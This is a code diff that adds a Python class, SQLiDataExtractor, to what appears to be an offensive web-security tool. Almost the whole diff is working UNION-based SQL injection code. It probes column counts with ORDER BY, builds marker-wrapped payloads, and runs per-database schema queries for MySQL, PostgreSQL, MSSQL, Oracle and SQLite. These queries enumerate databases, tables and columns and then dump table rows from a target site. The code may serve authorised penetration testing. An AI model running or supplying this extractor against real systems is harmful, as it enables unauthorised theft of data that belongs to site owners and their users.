@@ -303,3 +303,247 @@ class SQLiModule:
                 print(f"{Colors.error(f'Dump error: {e}')}")
         
         return results
+
+
+class SQLiDataExtractor:
+    """Extract data through confirmed SQL injection vulnerabilities.
+
+    Supports UNION-based extraction for MySQL, PostgreSQL, MSSQL, Oracle and
+    SQLite.  Each ``extract_*`` method sends one or more crafted payloads and
+    parses the response to pull out the requested information.
+    """
+
+    # Column-count discovery limits
+    _MAX_COLUMNS = 20
+
+    # DB-specific queries for information schema
+    _INFO_QUERIES = {
+        'mysql': {
+            'version': 'SELECT @@version',
+            'current_db': 'SELECT database()',
+            'current_user': 'SELECT user()',
+            'databases': "SELECT schema_name FROM information_schema.schemata",
+            'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
+            'columns': "SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
+            'rows': "SELECT {cols} FROM {db}.{table} LIMIT {limit} OFFSET {offset}",
+        },
+        'postgresql': {
+            'version': 'SELECT version()',
+            'current_db': 'SELECT current_database()',
+            'current_user': 'SELECT current_user',
+            'databases': "SELECT datname FROM pg_database",
+            'tables': "SELECT tablename FROM pg_tables WHERE schemaname='public'",
+            'columns': "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
+            'rows': "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
+        },
+        'mssql': {
+            'version': 'SELECT @@version',
+            'current_db': 'SELECT DB_NAME()',
+            'current_user': 'SELECT SYSTEM_USER',
+            'databases': "SELECT name FROM master.sys.databases",
+            'tables': "SELECT name FROM {db}.sys.tables",
+            'columns': "SELECT name FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{db}.dbo.{table}')",
+            'rows': "SELECT TOP {limit} {cols} FROM {db}.dbo.{table}",
+        },
+        'oracle': {
+            'version': 'SELECT banner FROM v$version WHERE ROWNUM=1',
+            'current_db': 'SELECT ora_database_name FROM dual',
+            'current_user': 'SELECT user FROM dual',
+            'databases': "SELECT DISTINCT owner FROM all_tables",
+            'tables': "SELECT table_name FROM all_tables WHERE owner='{db}'",
+            'columns': "SELECT column_name FROM all_tab_columns WHERE table_name='{table}' AND owner='{db}'",
+            'rows': "SELECT {cols} FROM {db}.{table} WHERE ROWNUM<={limit}",
+        },
+        'sqlite': {
+            'version': 'SELECT sqlite_version()',
+            'current_db': "SELECT 'main'",
+            'current_user': "SELECT 'default'",
+            'databases': "SELECT 'main'",
+            'tables': "SELECT name FROM sqlite_master WHERE type='table'",
+            'columns': "SELECT name FROM pragma_table_info('{table}')",
+            'rows': "SELECT {cols} FROM {table} LIMIT {limit} OFFSET {offset}",
+        },
+    }
+
+    def __init__(self, requester, *, db_type: str = 'mysql',
+                 num_columns: int = 0, injectable_index: int = 1,
+                 prefix: str = "'", suffix: str = " --",
+                 method: str = 'GET'):
+        self.requester = requester
+        self.db_type = db_type.lower()
+        self.num_columns = num_columns
+        self.injectable_index = injectable_index
+        self.prefix = prefix
+        self.suffix = suffix
+        self.method = method
+        self._marker_tag = 'AAAXTRCTAAA'
+
+    # ------------------------------------------------------------------
+    # Internal helpers
+    # ------------------------------------------------------------------
+
+    def _build_union_payload(self, inner_query: str) -> str:
+        """Build a full UNION SELECT payload injecting *inner_query* at the
+        injectable column position.  Other columns are filled with NULL."""
+        cols = []
+        for i in range(self.num_columns):
+            if i == self.injectable_index:
+                cols.append(self._wrap_concat(inner_query))
+            else:
+                cols.append('NULL')
+        return f"{self.prefix} UNION SELECT {','.join(cols)}{self.suffix}"
+
+    def _wrap_concat(self, expr: str) -> str:
+        """Wrap *expr* in database-specific string concatenation with
+        the extraction markers."""
+        tag = self._marker_tag
+        if self.db_type in ('mysql', 'sqlite'):
+            return f"CONCAT('{tag}',({expr}),'{tag}')"
+        elif self.db_type == 'postgresql':
+            return f"'{tag}'||({expr})||'{tag}'"
+        elif self.db_type == 'mssql':
+            return f"'{tag}'+CAST(({expr}) AS VARCHAR)+'{tag}'"
+        elif self.db_type == 'oracle':
+            return f"'{tag}'||({expr})||'{tag}'"
+        return f"CONCAT('{tag}',({expr}),'{tag}')"
+
+    def _send(self, url: str, param: str, payload: str):
+        """Fire the payload and return the response text or ''."""
+        data = {param: payload}
+        try:
+            resp = self.requester.request(url, self.method, data=data)
+            return resp.text if resp else ''
+        except Exception:
+            return ''
+
+    def _extract_between_markers(self, text: str) -> list:
+        """Return all strings enclosed between the extractor markers."""
+        results = []
+        tag = self._marker_tag
+        parts = text.split(tag)
+        # Parts at odd indices (1, 3, 5, …) are the extracted values
+        for i in range(1, len(parts), 2):
+            val = parts[i].strip()
+            if val:
+                results.append(val)
+        return results
+
+    # ------------------------------------------------------------------
+    # Column-count detection
+    # ------------------------------------------------------------------
+
+    def detect_columns(self, url: str, param: str) -> int:
+        """Detect the number of columns via ``ORDER BY`` probing."""
+        for n in range(1, self._MAX_COLUMNS + 1):
+            payload = f"{self.prefix} ORDER BY {n}{self.suffix}"
+            text = self._send(url, param, payload)
+            # If the response contains an error the previous count was valid
+            error_keywords = ['error', 'unknown column', 'order by',
+                              'sqlstate', 'syntax']
+            if any(kw in text.lower() for kw in error_keywords):
+                self.num_columns = n - 1
+                return self.num_columns
+        self.num_columns = 0
+        return 0
+
+    # ------------------------------------------------------------------
+    # Public extraction methods
+    # ------------------------------------------------------------------
+
+    def extract_version(self, url: str, param: str) -> str:
+        """Return the database server version string."""
+        q = self._INFO_QUERIES.get(self.db_type, {}).get('version', '')
+        if not q:
+            return ''
+        payload = self._build_union_payload(q)
+        text = self._send(url, param, payload)
+        results = self._extract_between_markers(text)
+        return results[0] if results else ''
+
+    def extract_current_db(self, url: str, param: str) -> str:
+        """Return the name of the current database."""
+        q = self._INFO_QUERIES.get(self.db_type, {}).get('current_db', '')
+        if not q:
+            return ''
+        payload = self._build_union_payload(q)
+        text = self._send(url, param, payload)
+        results = self._extract_between_markers(text)
+        return results[0] if results else ''
+
+    def extract_current_user(self, url: str, param: str) -> str:
+        """Return the current database user."""
+        q = self._INFO_QUERIES.get(self.db_type, {}).get('current_user', '')
+        if not q:
+            return ''
+        payload = self._build_union_payload(q)
+        text = self._send(url, param, payload)
+        results = self._extract_between_markers(text)
+        return results[0] if results else ''
+
+    def extract_databases(self, url: str, param: str) -> list:
+        """Return a list of database/schema names."""
+        q = self._INFO_QUERIES.get(self.db_type, {}).get('databases', '')
+        if not q:
+            return []
+        payload = self._build_union_payload(q)
+        text = self._send(url, param, payload)
+        return self._extract_between_markers(text)
+
+    def extract_tables(self, url: str, param: str, db: str = '') -> list:
+        """Return table names for the given database."""
+        q = self._INFO_QUERIES.get(self.db_type, {}).get('tables', '')
+        if not q:
+            return []
+        q = q.format(db=db)
+        payload = self._build_union_payload(q)
+        text = self._send(url, param, payload)
+        return self._extract_between_markers(text)
+
+    def extract_columns(self, url: str, param: str,
+                        table: str, db: str = '') -> list:
+        """Return column names for the given table."""
+        q = self._INFO_QUERIES.get(self.db_type, {}).get('columns', '')
+        if not q:
+            return []
+        q = q.format(table=table, db=db)
+        payload = self._build_union_payload(q)
+        text = self._send(url, param, payload)
+        return self._extract_between_markers(text)
+
+    def extract_rows(self, url: str, param: str, table: str,
+                     columns: list, *, db: str = '',
+                     limit: int = 10, offset: int = 0) -> list:
+        """Return rows from the given table as a list of dicts."""
+        q = self._INFO_QUERIES.get(self.db_type, {}).get('rows', '')
+        if not q or not columns:
+            return []
+        # Sanitise column names – only allow alphanumeric + underscore
+        import re as _re
+        safe_cols = [c for c in columns if _re.fullmatch(r'[A-Za-z_]\w*', c)]
+        if not safe_cols:
+            return []
+        # Build DB-specific row concatenation
+        if self.db_type in ('mysql', 'sqlite'):
+            concat_expr = "CONCAT_WS(',', " + ','.join(safe_cols) + ")"
+        elif self.db_type == 'postgresql':
+            concat_expr = ' || \',\' || '.join(safe_cols)
+        elif self.db_type == 'mssql':
+            casts = [f"CAST({c} AS VARCHAR)" for c in safe_cols]
+            concat_expr = " + ',' + ".join(casts)
+        elif self.db_type == 'oracle':
+            concat_expr = " || ',' || ".join(safe_cols)
+        else:
+            concat_expr = "CONCAT_WS(',', " + ','.join(safe_cols) + ")"
+        q = q.format(cols=concat_expr, db=db, table=table,
+                     limit=limit, offset=offset)
+        payload = self._build_union_payload(q)
+        text = self._send(url, param, payload)
+        raw = self._extract_between_markers(text)
+        rows = []
+        for line in raw:
+            parts = line.split(',')
+            row = {}
+            for i, col in enumerate(safe_cols):
+                row[col] = parts[i] if i < len(parts) else ''
+            rows.append(row)
+        return rows
